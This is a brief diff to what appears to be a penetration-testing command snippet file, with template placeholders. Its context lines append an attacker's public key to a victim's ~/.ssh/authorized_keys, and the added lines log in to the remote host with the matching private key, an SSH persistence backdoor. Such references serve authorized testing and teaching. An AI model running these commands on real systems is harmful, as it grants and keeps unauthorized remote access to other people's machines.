@@ -6,3 +6,6 @@ cat ~/.ssh/id_rsa.pub
 
 # desc: Victim
 echo "#{id_rsa_pub}" >> ~/.ssh/authorized_keys
+
+# desc: Login with Private key
+ssh -i id_rsa #{USER}@#{RHOST}
